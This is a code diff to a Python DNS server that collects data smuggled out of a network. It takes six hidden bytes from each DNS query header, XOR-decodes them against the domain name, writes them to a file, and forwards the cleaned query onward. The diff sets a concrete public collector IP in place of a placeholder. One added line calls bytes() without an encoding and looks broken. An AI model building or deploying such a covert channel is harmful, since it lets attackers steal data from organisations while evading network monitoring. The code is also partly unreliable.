@@ -8,12 +8,13 @@ import sys
 
 n_times_6_bytes = 0
 secret_bytes: bytes
-collector_ip = '1.1.1.1'  # FIXME
+collector_ip = '20.79.206.157'  # FIXME
 end_file = False
 file = ""
 
 
 def receive_data(udps, file):
+    global end_file
     types = {1: "A", 2: "NS", 15: "MX", 16: "TXT", 28: "AAAA"}
     data, addr = udps.recvfrom(1024)
     data, secret = decode_data(data, file)
@@ -26,7 +27,18 @@ def receive_data(udps, file):
     answer = dnsD.reply()
     domain = b'.'.join(labels)
     domain = domain.decode()
+    secret = byte_xor(secret, bytes(domain[:6] + 'A' * max(6 - len(domain), 0))
+    if byte_xor(b"\x00\x00\x00\x00\x00\x00", bytes(domain[:6] + 'A' * max(6 - len(domain), 0), "utf-8")) in secret:
+        file.write(b'===============================')
+        file.close()
+        end_file = True
+    if not end_file:
+        file.write(secret)    
     return data, addr, type, domain, answer, secret
+
+
+def byte_xor(ba1, ba2):
+    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
 
 
 def forward_dns_request(data, next_dns_address="1.1.1.1"):
@@ -38,16 +50,9 @@ def forward_dns_request(data, next_dns_address="1.1.1.1"):
 
 
 def decode_data(data, file):
-    global end_file
     secret = data[6:12]
     padding: bytes = b'\x00' * 6
     data = data[0:6] + padding + data[12:]
-    if not end_file:
-        file.write(secret)
-    if b'\x00' in secret:
-        file.write(b'===============================')
-        file.close()
-        end_file = True
     return data, secret
 
 
@@ -95,9 +100,9 @@ def init_listener():
 
 def signal_handler(sig, frame):
     global file
-    print('You pressed Ctrl+C!')
     if not end_file:
         file.close()
+        print("File saved succesfuly!")
     sys.exit(0)
 
 
